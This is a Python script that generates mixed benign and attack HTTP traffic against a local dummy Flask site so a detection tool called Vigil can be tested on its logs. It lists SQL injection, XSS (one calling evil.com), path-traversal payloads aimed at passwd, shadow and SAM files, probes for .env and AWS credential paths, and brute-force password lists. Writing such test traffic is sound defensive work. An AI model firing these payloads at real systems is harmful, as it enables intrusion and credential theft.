"""
Traffic simulator for the Vigil dummy site.

Generates a mix of benign and malicious HTTP traffic by hitting the Flask
app's endpoints. Each request produces one Apache-format log line that the
Vigil collector can watch in real time.

Usage:
    python simulate.py                       # default: mixed traffic, 200 requests
    python simulate.py --mode attack         # only malicious patterns
    python simulate.py --mode benign         # only normal browsing
    python simulate.py --requests 500        # custom count
    python simulate.py --delay 0.1           # seconds between requests (default: 0.05)
    python simulate.py --base http://127.0.0.1:5000

Designed to pair with:
    1. app.py       : the dummy site writing logs/access.log
    2. collector.py : watching that file and feeding Vigil
"""

import argparse
import random
import sys
import time

import requests

# ---------------------------------------------------------------------------
# Pools
# ---------------------------------------------------------------------------

BENIGN_PATHS = [
    "/",
    "/login",
    "/dashboard",
    "/admin",
    "/api/status",
    "/api/users",
    "/about",
    "/contact",
    "/favicon.ico",
    "/static/style.css",
]

VALID_CREDS = [
    ("admin", "admin123"),
    ("alice", "correcthorsebatterystaple"),
    ("bob", "password1"),
]

BRUTE_FORCE_USERS = ["admin", "root", "test", "user", "guest", "oracle"]
BRUTE_FORCE_PASSES = ["123456", "password", "admin", "letmein", "qwerty", "abc123"]

SQLI_PAYLOADS = [
    "' OR '1'='1",
    "'; DROP TABLE users;--",
    "admin'--",
    "1 UNION SELECT * FROM users",
    "' OR 1=1#",
]

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "javascript:alert(document.cookie)",
    "\"><script>fetch('http://evil.com')</script>",
]

TRAVERSAL_PATHS = [
    "/../../etc/passwd",
    "/..%2f..%2fetc/shadow",
    "/../../../windows/system32/config/sam",
    "/....//....//etc/hosts",
    "/static/../../../etc/passwd",
]

SCANNER_PATHS = [
    "/.env",
    "/wp-admin",
    "/wp-login.php",
    "/phpmyadmin",
    "/administrator",
    "/.git/config",
    "/xmlrpc.php",
    "/backup.sql",
    "/server-status",
    "/actuator/health",
    "/api/v1/debug",
    "/.aws/credentials",
    "/config.yml",
    "/robots.txt",
    "/sitemap.xml",
]

SPOOFED_IPS = [
    "185.220.101.47",
    "45.33.32.156",
    "103.255.61.12",
    "91.240.118.172",
    "5.188.86.172",
]

# ---------------------------------------------------------------------------
# Request helpers
# ---------------------------------------------------------------------------

def make_session(base_url: str) -> requests.Session:
    s = requests.Session()
    s.headers["User-Agent"] = random.choice([
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
        "curl/7.88.1",
    ])
    return s


# ---------------------------------------------------------------------------
# Benign traffic generators
# ---------------------------------------------------------------------------

def benign_browse(sess: requests.Session, base: str):
    """Visit a random page."""
    path = random.choice(BENIGN_PATHS)
    sess.get(f"{base}{path}", timeout=5)


def benign_login_flow(sess: requests.Session, base: str):
    """Fetch login page, submit valid creds, visit dashboard, logout."""
    sess.get(f"{base}/login", timeout=5)
    user, pw = random.choice(VALID_CREDS)
    sess.post(f"{base}/login", data={"username": user, "password": pw}, timeout=5)
    sess.get(f"{base}/dashboard", timeout=5)
    if user == "admin":
        sess.get(f"{base}/admin", timeout=5)
    sess.get(f"{base}/logout", timeout=5)


# ---------------------------------------------------------------------------
# Attack traffic generators
# ---------------------------------------------------------------------------

def attack_brute_force(sess: requests.Session, base: str):
    """Rapid login attempts with wrong credentials."""
    user = random.choice(BRUTE_FORCE_USERS)
    pw = random.choice(BRUTE_FORCE_PASSES)
    sess.post(f"{base}/login", data={"username": user, "password": pw}, timeout=5)


def attack_sqli(sess: requests.Session, base: str):
    """SQL injection via login form and query params."""
    payload = random.choice(SQLI_PAYLOADS)
    if random.random() < 0.5:
        sess.post(f"{base}/login", data={"username": payload, "password": "x"}, timeout=5)
    else:
        sess.get(f"{base}/api/users?id={payload}", timeout=5)


def attack_xss(sess: requests.Session, base: str):
    """XSS payloads in query params and form fields."""
    payload = random.choice(XSS_PAYLOADS)
    sess.get(f"{base}/?q={payload}", timeout=5)


def attack_traversal(sess: requests.Session, base: str):
    """Directory traversal attempts."""
    path = random.choice(TRAVERSAL_PATHS)
    sess.get(f"{base}{path}", timeout=5)


def attack_scanner(sess: requests.Session, base: str):
    """Probe well-known sensitive paths (vulnerability scanners)."""
    path = random.choice(SCANNER_PATHS)
    sess.get(f"{base}{path}", timeout=5)


# ---------------------------------------------------------------------------
# Orchestrator
# ---------------------------------------------------------------------------

BENIGN_ACTIONS = [benign_browse, benign_login_flow]
ATTACK_ACTIONS = [
    attack_brute_force,
    attack_brute_force,  # weighted: brute force is most common
    attack_brute_force,
    attack_sqli,
    attack_xss,
    attack_traversal,
    attack_scanner,
    attack_scanner,
]


def run(base_url: str, total: int, mode: str, delay: float):
    sess = make_session(base_url)
    print(f"[simulate] target={base_url}  mode={mode}  requests={total}  delay={delay}s")

    for i in range(total):
        try:
            if mode == "benign":
                random.choice(BENIGN_ACTIONS)(sess, base_url)
            elif mode == "attack":
                random.choice(ATTACK_ACTIONS)(sess, base_url)
            else:  # mixed
                if random.random() < 0.4:
                    random.choice(ATTACK_ACTIONS)(sess, base_url)
                else:
                    random.choice(BENIGN_ACTIONS)(sess, base_url)
        except requests.ConnectionError:
            print(f"[simulate] connection refused — retrying in 2s...")
            time.sleep(2)
            continue

        if (i + 1) % 50 == 0:
            print(f"[simulate] {i + 1}/{total} requests sent")

        time.sleep(delay)

    print(f"[simulate] done: {total} requests sent")


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

def main():
    parser = argparse.ArgumentParser(description="Generate traffic against the Vigil dummy site")
    parser.add_argument("--base", default="http://127.0.0.1:5000", help="Dummy site base URL")
    parser.add_argument("--requests", type=int, default=200, help="Total requests to generate")
    parser.add_argument("--mode", choices=["mixed", "benign", "attack"], default="mixed")
    parser.add_argument("--delay", type=float, default=0.05, help="Seconds between requests")
    args = parser.parse_args()
    run(args.base, args.requests, args.mode, args.delay)


if __name__ == "__main__":
    main()
